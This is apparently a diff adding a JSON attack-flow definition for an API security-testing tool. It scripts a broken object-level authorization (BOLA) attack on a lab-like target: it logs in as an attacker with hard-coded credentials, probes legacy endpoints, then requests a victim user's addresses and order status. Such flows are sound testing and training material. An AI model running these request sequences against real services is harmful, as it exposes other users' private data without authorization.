@@ -1,0 +1,83 @@
+{
+  "id": "flow_bola_legacy_endpoints_probe_and_access",
+  "name": "BOLA: Probe Legacy Endpoints and Access Another User",
+  "description": "Attacker logs in, probes legacy endpoints with missing or invalid parameters, then performs BOLA against another user's legacy address search and order status.",
+  "headers": {
+    "Accept": "application/json"
+  },
+  "staticVars": {
+    "baseUrl": "https://bla-bypass.ase-team.com",
+    "attackerUsername": "GraceWilson",
+    "attackerPassword": "GracePass7&",
+    "attackerUserId": "00000008-0000-0000-0000-000000000008",
+    "victimUserId": "00000003-0000-0000-0000-000000000003",
+    "victimOrderId": "aa6e4588-106a-5db4-aa38-d8c4cc717bfc",
+    "addressSearchQuery": "Capital",
+    "legacyToken": "legacy-probe",
+    "fakeOrderId": "ffffffff-ffff-ffff-ffff-ffffffffffff"
+  },
+  "steps": [
+    {
+      "id": "step_attacker_login_legacy_probe",
+      "name": "Login GraceWilson",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/auth/login?username={{attackerUsername}}&password={{attackerPassword}}",
+      "onFailure": "stop",
+      "extract": {
+        "attacker_token": "body.access_token"
+      }
+    },
+    {
+      "id": "step_attacker_probe_missing_query",
+      "name": "Probe Legacy Address Search (Missing q)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/addresses/search-legacy",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_attacker_bola_legacy_address_search",
+      "name": "BOLA: Legacy Address Search for Victim",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/users/{{victimUserId}}/addresses/search-legacy?q={{addressSearchQuery}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "stop"
+    },
+    {
+      "id": "step_attacker_probe_fake_order_status",
+      "name": "Probe Legacy Order Status (Fake Order ID)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/users/{{victimUserId}}/orders/{{fakeOrderId}}/status-legacy?legacy_token={{legacyToken}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_attacker_bola_legacy_order_status",
+      "name": "BOLA: Legacy Order Status for Victim",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/users/{{victimUserId}}/orders/{{victimOrderId}}/status-legacy?legacy_token={{legacyToken}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "stop"
+    }
+  ],
+  "visualLayout": {
+    "step_attacker_login_legacy_probe": { "x": 50, "y": 50 },
+    "step_attacker_probe_missing_query": { "x": 250, "y": 50 },
+    "step_attacker_bola_legacy_address_search": { "x": 450, "y": 50 },
+    "step_attacker_probe_fake_order_status": { "x": 250, "y": 150 },
+    "step_attacker_bola_legacy_order_status": { "x": 450, "y": 150 }
+  }
+}
